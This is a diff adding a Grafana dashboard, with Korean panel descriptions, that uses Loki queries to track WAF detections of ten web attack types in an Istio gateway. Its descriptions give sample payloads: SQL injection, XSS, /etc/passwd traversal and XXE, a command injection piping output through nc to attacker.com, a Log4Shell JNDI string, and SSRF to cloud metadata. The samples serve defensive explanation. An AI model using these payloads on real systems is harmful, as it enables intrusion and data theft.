@@ -1,0 +1,812 @@
+{
+  "annotations": { "list": [] },
+  "description": "Lua 스크립트 기반 WAF 보안 정책 모니터링. SQL Injection, XSS, Path Traversal 등 10가지 공격 유형 탐지 현황을 실시간으로 확인합니다.",
+  "editable": true,
+  "fiscalYearStartMonth": 0,
+  "graphTooltip": 1,
+  "id": null,
+  "links": [],
+  "panels": [
+    {
+      "collapsed": false,
+      "gridPos": { "h": 1, "w": 24, "x": 0, "y": 0 },
+      "id": 100,
+      "panels": [],
+      "title": "보안 현황 요약 (선택 범위)",
+      "type": "row"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## 총 탐지 건수\n\nWAF에서 탐지된 총 보안 위협 수입니다.\n\n**탐지 대상:**\n- SQL Injection\n- XSS\n- Path Traversal\n- Command Injection\n- LDAP Injection\n- XXE Injection\n- SSRF\n- Log4Shell\n- Header Injection\n- Bot/Scanner\n\n---\n\n## 🔍 탐지 로그 검색 방법\n\n**Grafana Explore에서 Loki로 검색:**\n```\n{namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"`\n```\n\n**공격 유형별 검색:**\n```\n{namespace=\"istio-system\"} |= `SQL_INJECTION`\n{namespace=\"istio-system\"} |= `XSS_DETECTED`\n{namespace=\"istio-system\"} |= `BOT_SCANNER`\n```\n\n**차단된 요청만 검색:**\n```\n{namespace=\"istio-system\"} |= `blocked\":true`\n```\n\n**특정 IP 검색:**\n```\n{namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` |= `공격자IP`\n```\n\n**CLI로 검색:**\n```bash\nkubectl logs -n istio-system -l app=istio-ingressgateway | grep security\n```\n\n💡 **Tip:** 아래 '최근 보안 이벤트' 패널에서 실시간 로그를 확인할 수 있습니다.",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "yellow", "value": 10 },
+              { "color": "red", "value": 100 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 0, "y": 1 },
+      "id": 1,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Total",
+          "refId": "A"
+        }
+      ],
+      "title": "총 탐지",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## 차단된 요청\n\nWAF가 실제로 차단한 요청 수입니다.\n\n**차단 조건:**\n- mode: \"block\" 설정 시 차단\n- mode: \"detect\" 설정 시 로그만 기록\n\n**응답:**\n- HTTP 403 Forbidden\n- 커스텀 에러 메시지",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "orange", "value": 1 },
+              { "color": "red", "value": 50 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 4, "y": 1 },
+      "id": 2,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `blocked\":true` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Blocked",
+          "refId": "A"
+        }
+      ],
+      "title": "차단됨",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## SQL Injection 탐지\n\n**SQL Injection이란?**\n악의적인 SQL 쿼리를 삽입하여 데이터베이스를 조작하는 공격\n\n**탐지 패턴:**\n- UNION SELECT\n- OR 1=1\n- DROP TABLE\n- INSERT INTO\n- 주석 문자 (--)\n\n**예시:**\n```\n/api/users?id=1' OR '1'='1\n/api/search?q='; DROP TABLE users;--\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 8, "y": 1 },
+      "id": 3,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `SQL_INJECTION` != `/api/datasources/` [$__range]))",
+          "legendFormat": "SQL Injection",
+          "refId": "A"
+        }
+      ],
+      "title": "SQL Injection",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## XSS (Cross-Site Scripting) 탐지\n\n**XSS란?**\n악성 스크립트를 웹 페이지에 삽입하는 공격\n\n**탐지 패턴:**\n- <script> 태그\n- javascript: 프로토콜\n- on* 이벤트 핸들러 (onclick, onerror 등)\n- eval(), alert()\n\n**예시:**\n```\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 12, "y": 1 },
+      "id": 4,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `XSS_DETECTED` != `/api/datasources/` [$__range]))",
+          "legendFormat": "XSS",
+          "refId": "A"
+        }
+      ],
+      "title": "XSS",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## Path Traversal 탐지\n\n**Path Traversal이란?**\n디렉토리 경로를 조작하여 허용되지 않은 파일에 접근하는 공격\n\n**탐지 패턴:**\n- ../\n- ..%2f (URL 인코딩)\n- /etc/passwd\n- /windows/system32\n\n**예시:**\n```\n/api/files?path=../../etc/passwd\n/download?file=..%2f..%2fsecrets\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 16, "y": 1 },
+      "id": 5,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `PATH_TRAVERSAL` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Path Traversal",
+          "refId": "A"
+        }
+      ],
+      "title": "Path Traversal",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## Bot/Scanner 탐지\n\n**Bot/Scanner란?**\n자동화된 취약점 스캐너나 악성 봇의 접근\n\n**탐지 패턴:**\n- sqlmap (SQL Injection 도구)\n- nikto (웹 스캐너)\n- nmap (포트 스캐너)\n- masscan\n- 의심스러운 User-Agent\n\n**예시:**\n```\nUser-Agent: sqlmap/1.4\nUser-Agent: Nikto/2.1.6\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "yellow", "value": 1 },
+              { "color": "red", "value": 10 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 20, "y": 1 },
+      "id": 6,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `BOT_SCANNER` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Bot/Scanner",
+          "refId": "A"
+        }
+      ],
+      "title": "Bot/Scanner",
+      "type": "stat"
+    },
+    {
+      "collapsed": false,
+      "gridPos": { "h": 1, "w": 24, "x": 0, "y": 5 },
+      "id": 101,
+      "panels": [],
+      "title": "추가 보안 탐지",
+      "type": "row"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## Command Injection 탐지\n\n**Command Injection이란?**\n시스템 명령어를 삽입하여 서버에서 실행시키는 공격\n\n**탐지 패턴:**\n- ; (명령어 구분자)\n- | (파이프)\n- && (AND 연산자)\n- `command` (백틱 실행)\n- $(command)\n\n**예시:**\n```\n/api/ping?host=google.com;cat /etc/passwd\n/api/exec?cmd=ls|nc attacker.com 1234\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 0, "y": 6 },
+      "id": 7,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `COMMAND_INJECTION` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Command Injection",
+          "refId": "A"
+        }
+      ],
+      "title": "Command Injection",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## LDAP Injection 탐지\n\n**LDAP Injection이란?**\nLDAP 쿼리를 조작하여 디렉토리 서비스를 공격\n\n**탐지 패턴:**\n- )( (필터 조작)\n- *(|(objectClass=*)) (와일드카드)\n- null 바이트 삽입\n\n**예시:**\n```\n/api/user?name=*)(uid=*))(|(uid=*\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 4, "y": 6 },
+      "id": 8,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `LDAP_INJECTION` != `/api/datasources/` [$__range]))",
+          "legendFormat": "LDAP Injection",
+          "refId": "A"
+        }
+      ],
+      "title": "LDAP Injection",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## XXE Injection 탐지\n\n**XXE (XML External Entity)란?**\nXML 파서의 외부 엔티티 기능을 악용하는 공격\n\n**탐지 패턴:**\n- <!DOCTYPE\n- <!ENTITY\n- SYSTEM \"file://\n- SYSTEM \"http://\n\n**예시:**\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<foo>&xxe;</foo>\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 8, "y": 6 },
+      "id": 9,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `XXE_INJECTION` != `/api/datasources/` [$__range]))",
+          "legendFormat": "XXE",
+          "refId": "A"
+        }
+      ],
+      "title": "XXE Injection",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## SSRF 탐지\n\n**SSRF (Server-Side Request Forgery)란?**\n서버가 내부 리소스에 요청을 보내도록 유도하는 공격\n\n**탐지 패턴:**\n- localhost, 127.0.0.1\n- 169.254.169.254 (AWS 메타데이터)\n- 내부 IP 대역 (10.x, 172.16-31.x, 192.168.x)\n- file:// 프로토콜\n\n**예시:**\n```\n/api/fetch?url=http://169.254.169.254/latest/meta-data/\n/api/proxy?target=http://localhost:6379\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 12, "y": 6 },
+      "id": 10,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `SSRF_DETECTED` != `/api/datasources/` [$__range]))",
+          "legendFormat": "SSRF",
+          "refId": "A"
+        }
+      ],
+      "title": "SSRF",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## Log4Shell 탐지\n\n**Log4Shell (CVE-2021-44228)이란?**\nLog4j 라이브러리의 JNDI 룩업 취약점\n\n**탐지 패턴:**\n- ${jndi:ldap://\n- ${jndi:rmi://\n- ${jndi:dns://\n- 난독화 변형 (${${lower:j}ndi: 등)\n\n**예시:**\n```\n${jndi:ldap://attacker.com/exploit}\nUser-Agent: ${jndi:ldap://x.x.x.x/a}\n```\n\n**심각도: Critical**",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 16, "y": 6 },
+      "id": 11,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `LOG4SHELL` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Log4Shell",
+          "refId": "A"
+        }
+      ],
+      "title": "Log4Shell",
+      "type": "stat"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## Header Injection 탐지\n\n**Header Injection이란?**\nHTTP 헤더에 악성 값을 삽입하는 공격\n\n**탐지 패턴:**\n- CRLF 문자 (%0d%0a)\n- 줄바꿈을 이용한 헤더 추가\n- Host 헤더 조작\n\n**예시:**\n```\n/api?param=value%0d%0aSet-Cookie:session=evil\nHost: attacker.com\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "mappings": [],
+          "thresholds": {
+            "mode": "absolute",
+            "steps": [
+              { "color": "green", "value": null },
+              { "color": "red", "value": 1 }
+            ]
+          },
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 4, "w": 4, "x": 20, "y": 6 },
+      "id": 12,
+      "options": {
+        "colorMode": "value",
+        "graphMode": "area",
+        "justifyMode": "auto",
+        "orientation": "auto",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "textMode": "auto"
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `HEADER_INJECTION` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Header Injection",
+          "refId": "A"
+        }
+      ],
+      "title": "Header Injection",
+      "type": "stat"
+    },
+    {
+      "collapsed": false,
+      "gridPos": { "h": 1, "w": 24, "x": 0, "y": 10 },
+      "id": 102,
+      "panels": [],
+      "title": "시간별 추이",
+      "type": "row"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## 공격 유형별 시간 추이\n\n시간에 따른 각 공격 유형의 탐지 현황입니다.\n\n**패턴 분석:**\n- 특정 시간대 집중 공격\n- 봇 스캔 패턴 (주기적)\n- 타겟 공격 (급격한 스파이크)",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "palette-classic" },
+          "custom": {
+            "axisBorderShow": false,
+            "axisCenteredZero": false,
+            "axisColorMode": "text",
+            "axisLabel": "",
+            "axisPlacement": "auto",
+            "barAlignment": 0,
+            "drawStyle": "line",
+            "fillOpacity": 20,
+            "gradientMode": "none",
+            "hideFrom": { "legend": false, "tooltip": false, "viz": false },
+            "lineInterpolation": "smooth",
+            "lineWidth": 2,
+            "pointSize": 5,
+            "scaleDistribution": { "type": "linear" },
+            "showPoints": "never",
+            "spanNulls": false,
+            "stacking": { "group": "A", "mode": "none" },
+            "thresholdsStyle": { "mode": "off" }
+          },
+          "mappings": [],
+          "thresholds": { "mode": "absolute", "steps": [{ "color": "green", "value": null }] },
+          "unit": "short"
+        },
+        "overrides": [
+          { "matcher": { "id": "byName", "options": "SQL Injection" }, "properties": [{ "id": "color", "value": { "fixedColor": "red", "mode": "fixed" } }] },
+          { "matcher": { "id": "byName", "options": "XSS" }, "properties": [{ "id": "color", "value": { "fixedColor": "orange", "mode": "fixed" } }] },
+          { "matcher": { "id": "byName", "options": "Bot/Scanner" }, "properties": [{ "id": "color", "value": { "fixedColor": "purple", "mode": "fixed" } }] }
+        ]
+      },
+      "gridPos": { "h": 8, "w": 24, "x": 0, "y": 11 },
+      "id": 13,
+      "options": {
+        "legend": { "calcs": ["sum"], "displayMode": "table", "placement": "right", "showLegend": true },
+        "tooltip": { "mode": "multi", "sort": "desc" }
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `SQL_INJECTION` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "SQL Injection",
+          "refId": "A"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `XSS_DETECTED` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "XSS",
+          "refId": "B"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `PATH_TRAVERSAL` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "Path Traversal",
+          "refId": "C"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `COMMAND_INJECTION` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "Command Injection",
+          "refId": "D"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `BOT_SCANNER` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "Bot/Scanner",
+          "refId": "E"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `LOG4SHELL` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "Log4Shell",
+          "refId": "F"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `SSRF` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "SSRF",
+          "refId": "G"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `LDAP_INJECTION` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "LDAP Injection",
+          "refId": "H"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `XXE_INJECTION` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "XXE Injection",
+          "refId": "I"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `HEADER_INJECTION` != `/api/datasources/` [$__auto]))",
+          "legendFormat": "Header Injection",
+          "refId": "J"
+        }
+      ],
+      "title": "공격 유형별 탐지 추이",
+      "type": "timeseries"
+    },
+    {
+      "collapsed": false,
+      "gridPos": { "h": 1, "w": 24, "x": 0, "y": 19 },
+      "id": 103,
+      "panels": [],
+      "title": "상세 분석",
+      "type": "row"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## 공격 유형 분포\n\n전체 탐지 중 각 공격 유형이 차지하는 비율입니다.\n\n**일반적인 패턴:**\n- Bot/Scanner가 가장 많음 (자동화 스캔)\n- SQL Injection, XSS가 그 다음\n- Log4Shell은 적지만 심각도 높음",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "palette-classic" },
+          "custom": { "hideFrom": { "legend": false, "tooltip": false, "viz": false } },
+          "mappings": [],
+          "unit": "short"
+        },
+        "overrides": []
+      },
+      "gridPos": { "h": 8, "w": 8, "x": 0, "y": 20 },
+      "id": 14,
+      "options": {
+        "displayLabels": ["name", "percent"],
+        "legend": { "displayMode": "table", "placement": "right", "showLegend": true, "values": ["value"] },
+        "pieType": "donut",
+        "reduceOptions": { "calcs": ["lastNotNull"], "fields": "", "values": false },
+        "tooltip": { "mode": "single", "sort": "none" }
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `SQL_INJECTION` != `/api/datasources/` [$__range]))",
+          "legendFormat": "SQL Injection",
+          "refId": "A"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `XSS_DETECTED` != `/api/datasources/` [$__range]))",
+          "legendFormat": "XSS",
+          "refId": "B"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `PATH_TRAVERSAL` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Path Traversal",
+          "refId": "C"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `COMMAND_INJECTION` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Command Injection",
+          "refId": "D"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `BOT_SCANNER` != `/api/datasources/` [$__range]))",
+          "legendFormat": "Bot/Scanner",
+          "refId": "E"
+        },
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum(count_over_time({namespace=\"istio-system\"} |= `script log:` |= `SSRF` != `/api/datasources/` [$__range]))",
+          "legendFormat": "SSRF",
+          "refId": "F"
+        }
+      ],
+      "title": "공격 유형 분포",
+      "type": "piechart"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## 최근 보안 이벤트 로그\n\n실시간으로 탐지되는 보안 이벤트 로그입니다.\n\n**로그 필드:**\n- timestamp: 탐지 시간\n- event: 공격 유형\n- client_ip: 공격자 IP\n- path: 공격 대상 경로\n- blocked: 차단 여부\n- matched: 매칭된 패턴\n\n---\n\n## 🔍 상세 검색하려면\n\n**Grafana 메뉴 → Explore → Loki 선택**\n\n**전체 보안 이벤트:**\n```\n{namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` | json\n```\n\n**JSON 파싱 후 필터:**\n```\n{namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` | json | event = `SQL_INJECTION`\n```\n\n**특정 경로 공격 검색:**\n```\n{namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` | json | path =~ `/api/.*`\n```\n\n**로그 클릭 시 상세 정보 확인 가능!**",
+      "gridPos": { "h": 8, "w": 16, "x": 8, "y": 20 },
+      "id": 15,
+      "options": {
+        "dedupStrategy": "none",
+        "enableLogDetails": true,
+        "prettifyLogMessage": true,
+        "showCommonLabels": false,
+        "showLabels": false,
+        "showTime": true,
+        "sortOrder": "Descending",
+        "wrapLogMessage": true
+      },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "{namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` != `/api/datasources/`",
+          "legendFormat": "",
+          "refId": "A"
+        }
+      ],
+      "title": "최근 보안 이벤트",
+      "type": "logs"
+    },
+    {
+      "collapsed": false,
+      "gridPos": { "h": 1, "w": 24, "x": 0, "y": 28 },
+      "id": 104,
+      "panels": [],
+      "title": "Top 5 위협 분석",
+      "type": "row"
+    },
+    {
+      "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+      "description": "## Top 5 공격자 IP\n\n가장 많은 공격을 시도한 IP 주소입니다.\n\n**조치 방법:**\n- 반복 공격 IP는 방화벽에서 차단 고려\n- IP 평판 조회: https://www.abuseipdb.com/\n\n**차단 명령어:**\n```bash\n# Calico GlobalNetworkPolicy로 차단\nkubectl apply -f - <<EOF\napiVersion: projectcalico.org/v3\nkind: GlobalNetworkPolicy\nmetadata:\n  name: block-attacker-ip\nspec:\n  selector: all()\n  types:\n  - Ingress\n  ingress:\n  - action: Deny\n    source:\n      nets:\n      - \"공격자IP/32\"\nEOF\n```",
+      "fieldConfig": {
+        "defaults": {
+          "color": { "mode": "thresholds" },
+          "custom": { "align": "auto", "cellOptions": { "type": "auto" }, "inspect": false },
+          "mappings": [],
+          "thresholds": { "mode": "absolute", "steps": [{ "color": "green", "value": null }, { "color": "yellow", "value": 10 }, { "color": "red", "value": 50 }] }
+        },
+        "overrides": [
+          { "matcher": { "id": "byName", "options": "건수" }, "properties": [{ "id": "custom.cellOptions", "value": { "mode": "basic", "type": "color-background" } }] }
+        ]
+      },
+      "gridPos": { "h": 8, "w": 12, "x": 0, "y": 29 },
+      "id": 16,
+      "options": { "cellHeight": "sm", "footer": { "countRows": false, "fields": "", "reducer": ["sum"], "show": false }, "showHeader": true, "sortBy": [{ "desc": true, "displayName": "건수" }] },
+      "targets": [
+        {
+          "datasource": { "type": "loki", "uid": "${lokidatasource}" },
+          "expr": "sum by (client_ip) (count_over_time({namespace=\"istio-system\"} |= `script log:` |= `type\":\"security\"` != `/api/datasources/` | regexp `client_ip\\\":\\\"(?P<client_ip>[^\\\"]+)\\\"` [$__range]))",
+          "legendFormat": "",
+          "refId": "A"
+        }
+      ],
+      "title": "🚨 Top 공격자 IP",
+      "transformations": [
+        { "id": "reduce", "options": { "reducers": ["lastNotNull"] } },
+        { "id": "organize", "options": { "renameByName": { "Field": "공격자 IP", "Total": "건수" } } },
